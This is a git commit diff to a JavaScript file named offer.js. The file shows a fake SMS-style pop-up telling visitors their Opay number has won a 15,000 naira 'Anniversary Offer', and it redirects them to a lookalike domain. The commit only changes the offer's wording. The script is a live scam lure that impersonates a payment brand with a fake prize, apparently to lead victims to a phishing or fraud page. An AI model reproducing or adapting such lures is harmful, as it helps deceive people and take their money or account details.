f39f5a6f73a03887d3fbbca2c07c9df343089b0f
essac5 <154714847+essac5@users.noreply.github.com>
2024-10-05 05:06:18 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'WITHDRAW ₦15,000'
-password=prompt('SMS: Congratulations Your Opay Number is Eligible to receive ₦15,000 Opay Independence Day Offer, Kindly Press OK to Withdraw Cash Prize ','WITHDRAW ₦15,000');
+password=prompt('SMS: Congratulations Your Opay Number is Eligible to receive ₦15,000 Opay Anniversary Offer, Kindly Press OK to Withdraw Cash Prize ','WITHDRAW ₦15,000');
 if (password != 'WITHDRAW ₦15,000') {
 location.href='https://opay-anniversary.programs.lat/Naija';
 }
